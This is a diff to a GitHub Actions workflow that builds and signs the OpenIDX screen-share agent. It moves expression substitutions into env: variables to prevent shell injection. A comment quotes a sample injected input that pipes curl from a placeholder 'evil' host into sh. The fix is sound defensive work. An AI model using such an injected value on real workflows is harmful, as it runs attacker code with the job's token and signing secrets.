@@ -106,25 +106,38 @@ jobs:
             || { echo "::error::mingw gcc not on PATH"; exit 1; }
           echo "libvpx + mingw toolchain verified at $TRIPLET_DIR"
 
+      # Every ${{ }} below goes through env: rather than into the script text.
+      # The expression engine substitutes before the shell parses, so a
+      # workflow_dispatch input like `"; curl evil | sh; #` would execute on the
+      # runner with this job's token and its signing secrets. Semgrep's
+      # run-shell-injection rule flags exactly this; through env: the value
+      # arrives as data a quoted expansion reads.
       - name: Resolve version
         id: ver
         shell: bash
+        env:
+          INPUT_VERSION: ${{ inputs.version || '0.1.0' }}
         run: |
           # On a tag `agent-v1.2.0`, version = 1.2.0; else the dispatch input.
           if [[ "$GITHUB_REF" == refs/tags/agent-v* ]]; then
             echo "version=${GITHUB_REF#refs/tags/agent-v}" >> "$GITHUB_OUTPUT"
             echo "release=true" >> "$GITHUB_OUTPUT"
           else
-            echo "version=${{ inputs.version || '0.1.0' }}" >> "$GITHUB_OUTPUT"
+            echo "version=$INPUT_VERSION" >> "$GITHUB_OUTPUT"
             echo "release=false" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Build openidx-agent.exe
         working-directory: agent
         shell: bash
+        env:
+          AGENT_VERSION: ${{ steps.ver.outputs.version }}
+          AGENT_COMMIT: ${{ github.sha }}
+          IS_RELEASE: ${{ steps.ver.outputs.release }}
+          ALLOW_PURE_GO: ${{ github.event.inputs.allow_pure_go }}
         run: |
           mkdir -p dist
-          LDFLAGS="-s -w -X main.Version=${{ steps.ver.outputs.version }} -X main.Commit=${{ github.sha }}"
+          LDFLAGS="-s -w -X main.Version=$AGENT_VERSION -X main.Commit=$AGENT_COMMIT"
 
           # Build the real screen-share agent (-tags screenshare, CGO + libvpx).
           # The native toolchain was already installed AND verified above, so a
@@ -163,8 +176,6 @@ jobs:
               [ -f "$d/libwinpthread-1.dll" ] && cp "$d/libwinpthread-1.dll" dist/ 2>/dev/null && break
             done || true
           else
-            IS_RELEASE="${{ steps.ver.outputs.release }}"
-            ALLOW_PURE_GO="${{ github.event.inputs.allow_pure_go }}"
             if [ "$IS_RELEASE" = "true" ] || [ "$ALLOW_PURE_GO" != "true" ]; then
               echo "::error::screenshare (VP8 capture) build failed and a pure-Go fallback is not permitted here — a video-less agent must never be shipped. Fix the CGO/libvpx build. (release=$IS_RELEASE, allow_pure_go=$ALLOW_PURE_GO)"
               exit 1
@@ -262,6 +273,8 @@ jobs:
 
       - name: Build MSI
         shell: bash
+        env:
+          AGENT_VERSION: ${{ steps.ver.outputs.version }}
         run: |
           mkdir -p dist
           # Include the libvpx runtime DLL in the MSI only when the screenshare
@@ -282,22 +295,24 @@ jobs:
           fi
           wix build agent/packaging/wix/OpenIDX.wxs \
             -ext WixToolset.Util.wixext \
-            -d Version=${{ steps.ver.outputs.version }} \
+            -d "Version=$AGENT_VERSION" \
             -d ExePath=agent/dist/openidx-agent.exe \
             $VPX_ARG \
             $PTHREAD_ARG \
             -arch x64 \
-            -o dist/OpenIDX-${{ steps.ver.outputs.version }}.msi
+            -o "dist/OpenIDX-$AGENT_VERSION.msi"
 
       # Sign the packaged MSI (contains the already-signed exe). latest.json is
       # generated AFTER this so its sha256 matches the signed MSI.
       - name: Sign MSI
         if: ${{ env.WINDOWS_CERT_PFX_BASE64 != '' }}
         shell: pwsh
+        env:
+          AGENT_VERSION: ${{ steps.ver.outputs.version }}
         run: |
           & "$env:SIGNTOOL" sign /f "$env:RUNNER_TEMP\cert.pfx" /p "$env:WINDOWS_CERT_PASSWORD" `
-            /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 "dist/OpenIDX-${{ steps.ver.outputs.version }}.msi"
-          & "$env:SIGNTOOL" verify /pa "dist/OpenIDX-${{ steps.ver.outputs.version }}.msi"
+            /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 "dist/OpenIDX-$($env:AGENT_VERSION).msi"
+          & "$env:SIGNTOOL" verify /pa "dist/OpenIDX-$($env:AGENT_VERSION).msi"
 
       - name: Upload artifacts
         uses: actions/upload-artifact@v4
@@ -316,11 +331,15 @@ jobs:
       - name: Generate latest.json
         if: steps.ver.outputs.release == 'true'
         shell: pwsh
+        env:
+          AGENT_VERSION: ${{ steps.ver.outputs.version }}
+          GH_REPOSITORY: ${{ github.repository }}
+          GH_REF_NAME: ${{ github.ref_name }}
         run: |
-          $ver = "${{ steps.ver.outputs.version }}"
+          $ver = $env:AGENT_VERSION
           $msi = "dist/OpenIDX-$ver.msi"
           $sha = (Get-FileHash -Algorithm SHA256 $msi).Hash.ToLower()
-          $url = "https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/OpenIDX-$ver.msi"
+          $url = "https://github.com/$($env:GH_REPOSITORY)/releases/download/$($env:GH_REF_NAME)/OpenIDX-$ver.msi"
           $manifest = [ordered]@{ version = $ver; url = $url; sha256 = $sha }
           $manifest | ConvertTo-Json | Set-Content -Path dist/latest.json -Encoding utf8
           Get-Content dist/latest.json
@@ -328,18 +347,25 @@ jobs:
       - name: Stamp install script
         if: steps.ver.outputs.release == 'true'
         shell: pwsh
-        run: |
-          $ver     = "${{ steps.ver.outputs.version }}"
-          $repo    = "${{ github.repository }}"
-          $tag     = "${{ github.ref_name }}"
-          $msiUrl  = "https://github.com/$repo/releases/download/$tag/OpenIDX-$ver.msi"
-          $manUrl  = "https://github.com/$repo/releases/latest/download/latest.json"
+        env:
+          AGENT_VERSION: ${{ steps.ver.outputs.version }}
+          GH_REPOSITORY: ${{ github.repository }}
+          GH_REF_NAME: ${{ github.ref_name }}
           # Deployment defaults come from repo variables so the published script
           # is a true one-liner. Blank values stay as safe placeholders that the
           # operator overrides with -Server/-Token/-ServerIP.
-          $server  = "${{ vars.AGENT_DEFAULT_SERVER_URL }}"
-          $token   = "${{ vars.AGENT_DEFAULT_ENROLL_TOKEN }}"
-          $serverIp= "${{ vars.AGENT_DEFAULT_SERVER_IP }}"
+          DEFAULT_SERVER_URL: ${{ vars.AGENT_DEFAULT_SERVER_URL }}
+          DEFAULT_ENROLL_TOKEN: ${{ vars.AGENT_DEFAULT_ENROLL_TOKEN }}
+          DEFAULT_SERVER_IP: ${{ vars.AGENT_DEFAULT_SERVER_IP }}
+        run: |
+          $ver     = $env:AGENT_VERSION
+          $repo    = $env:GH_REPOSITORY
+          $tag     = $env:GH_REF_NAME
+          $msiUrl  = "https://github.com/$repo/releases/download/$tag/OpenIDX-$ver.msi"
+          $manUrl  = "https://github.com/$repo/releases/latest/download/latest.json"
+          $server  = $env:DEFAULT_SERVER_URL
+          $token   = $env:DEFAULT_ENROLL_TOKEN
+          $serverIp= $env:DEFAULT_SERVER_IP
           $src = Get-Content agent/scripts/install-openidx-agent.ps1 -Raw
           $src = $src.Replace('__MSI_URL__', $msiUrl).Replace('__MANIFEST_URL__', $manUrl)
           $src = $src.Replace('__SERVER_URL__', $server).Replace('__ENROLL_TOKEN__', $token).Replace('__SERVER_IP__', $serverIp)
